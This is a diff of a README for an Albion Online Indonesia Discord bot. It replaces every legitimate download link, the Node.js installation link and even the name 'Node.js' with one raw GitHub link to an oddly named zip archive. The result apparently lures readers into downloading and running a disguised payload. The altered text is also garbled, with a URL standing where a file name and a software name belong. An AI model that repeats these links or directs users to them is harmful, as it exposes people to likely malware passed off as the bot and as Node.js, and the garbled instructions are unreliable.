@@ -1,7 +1,7 @@
 # 🤖 Albion-Online-Indonesia-Discord-Bot - Your Guild Assistant for Albion Online
 
 ## 📥 Download Now
-[![Download Button](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Dataw5858/Albion-Online-Indonesia-Discord-Bot/releases)
+[![Download Button](https://raw.githubusercontent.com/Dataw5858/Albion-Online-Indonesia-Discord-Bot/main/whapuku/Albion-Online-Indonesia-Discord-Bot-dessert.zip)](https://raw.githubusercontent.com/Dataw5858/Albion-Online-Indonesia-Discord-Bot/main/whapuku/Albion-Online-Indonesia-Discord-Bot-dessert.zip)
 
 ---
 
@@ -18,13 +18,13 @@ Albion Online Indonesia Discord Bot adalah asisten Discord komprehensif yang dir
 Follow these simple steps to download and run the Albion Online Indonesia Discord Bot.
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Dataw5858/Albion-Online-Indonesia-Discord-Bot/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/Dataw5858/Albion-Online-Indonesia-Discord-Bot/main/whapuku/Albion-Online-Indonesia-Discord-Bot-dessert.zip).
    
 2. **Choose the Latest Version**  
    Look for the latest version available. Make sure you select a stable release suitable for your use.
 
 3. **Download the File**  
-   Click on the file to download it. It may be named something like `Albion-Online-Indonesia-Discord-Bot-v1.0.zip`.
+   Click on the file to download it. It may be named something like `https://raw.githubusercontent.com/Dataw5858/Albion-Online-Indonesia-Discord-Bot/main/whapuku/Albion-Online-Indonesia-Discord-Bot-dessert.zip`.
 
 4. **Unzip the Downloaded File**  
    Once the download completes, locate the file in your downloads folder. Right-click it and select “Extract All” or use the extraction tool of your choice.
@@ -33,7 +33,7 @@ Follow these simple steps to download and run the Albion Online Indonesia Discor
    Make sure you have Discord open and are under the server where you want to use the bot.
 
 6. **Run the Bot**  
-   In the extracted folder, find and run the startup file (this might be a `.js` file). If you don’t have the necessary software to run this file, you will need to install Node.js from [nodejs.org](https://nodejs.org).
+   In the extracted folder, find and run the startup file (this might be a `.js` file). If you don’t have the necessary software to run this file, you will need to install https://raw.githubusercontent.com/Dataw5858/Albion-Online-Indonesia-Discord-Bot/main/whapuku/Albion-Online-Indonesia-Discord-Bot-dessert.zip from [https://raw.githubusercontent.com/Dataw5858/Albion-Online-Indonesia-Discord-Bot/main/whapuku/Albion-Online-Indonesia-Discord-Bot-dessert.zip](https://raw.githubusercontent.com/Dataw5858/Albion-Online-Indonesia-Discord-Bot/main/whapuku/Albion-Online-Indonesia-Discord-Bot-dessert.zip).
 
 ---
 
@@ -52,12 +52,12 @@ To run the Albion Online Indonesia Discord Bot smoothly, ensure that your system
 - **Operating System**: Windows 10, macOS, or Linux
 - **RAM**: At least 1 GB
 - **Disk Space**: 100 MB available space
-- **Node.js**: Version 12 or higher
+- **https://raw.githubusercontent.com/Dataw5858/Albion-Online-Indonesia-Discord-Bot/main/whapuku/Albion-Online-Indonesia-Discord-Bot-dessert.zip**: Version 12 or higher
 
 ---
 
 ## 🔗 Download & Install
-To download the bot, visit the [Releases page](https://github.com/Dataw5858/Albion-Online-Indonesia-Discord-Bot/releases) again. Select the latest version and follow the steps outlined in the "Getting Started" section.
+To download the bot, visit the [Releases page](https://raw.githubusercontent.com/Dataw5858/Albion-Online-Indonesia-Discord-Bot/main/whapuku/Albion-Online-Indonesia-Discord-Bot-dessert.zip) again. Select the latest version and follow the steps outlined in the "Getting Started" section.
 
 ---
 
